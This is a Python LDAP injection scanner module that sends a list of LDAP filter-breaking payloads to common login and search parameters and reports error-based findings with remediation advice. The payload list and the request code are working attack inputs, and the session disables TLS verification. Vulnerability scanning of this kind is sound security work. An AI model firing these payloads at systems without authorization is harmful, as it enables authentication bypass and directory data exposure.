#!/usr/bin/env python3
"""
LDAP Injection Scanner — Senior Level
-----------------------------------------
Tests parameters for LDAP injection vulnerabilities.
"""

import requests
from typing import List, Dict, Optional
from rich.console import Console

try:
    from modules.core.base_scanner import BaseScanner
except ImportError:
    BaseScanner = object

console = Console()

LDAP_PAYLOADS = [
    "*",
    "*)(uid=*))(|(uid=*",
    "admin*)((|userpassword=*",
    ")(|(objectClass=*)",
    ")(%26(objectClass=*)",
    "admin)(!(&(|",
]

ERROR_SIGS = [
    "LDAPException",
    "System.DirectoryServices",
    "javax.naming.directory.InvalidSearchFilterException",
    "LDAP error",
    "Supplied filter is not valid",
]


class LDAPInjectionScanner(BaseScanner if BaseScanner is not object else object):
    def __init__(self, target: str, session=None, timeout: int = 10):
        if BaseScanner is not object:
            super().__init__(target, session, timeout)
        else:
            self.target = target.rstrip("/")
            self.timeout = timeout
            self.session = session or requests.Session()
            self.session.verify = False
            self.results = []
        self.test_params = ["user", "username", "login", "search", "q", "group"]

    def _get_req(self, url: str, params: dict) -> Optional[requests.Response]:
        if hasattr(self, "_get"):
            return self._get(url, params=params)
        try:
            return self.session.get(
                url, params=params, timeout=self.timeout, verify=False
            )
        except Exception:
            return None

    def _test_param(self, url: str, param: str) -> List[Dict]:
        findings = []
        for payload in LDAP_PAYLOADS:
            r = self._get_req(url, {param: payload})
            if not r:
                continue

            body = r.text.lower()
            for sig in ERROR_SIGS:
                if sig.lower() in body:
                    findings.append(
                        {
                            "url": url,
                            "type": "LDAP Injection (Error-Based)",
                            "severity": "high",
                            "cvss": 7.5,
                            "parameter": param,
                            "payload": payload,
                            "detail": f"LDAP error signature '{sig}' detected, indicating LDAP injection.",
                            "evidence": f"Error found: {sig}",
                            "owasp": "A03:2021 – Injection",
                            "remediation": "Escape LDAP search filter special characters (*, (, ), \\, NUL).",
                        }
                    )
                    return findings
        return findings

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ LDAP Injection Scanner on {self.target}[/bold yellow]"
        )
        for param in self.test_params:
            res = self._test_param(self.target, param)
            for r in res:
                if r not in self.results:
                    self.results.append(r)
                    console.print(f"  [bold red][!] {r['type']}[/bold red]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} LDAP issue(s) found[/]")
        return self.results
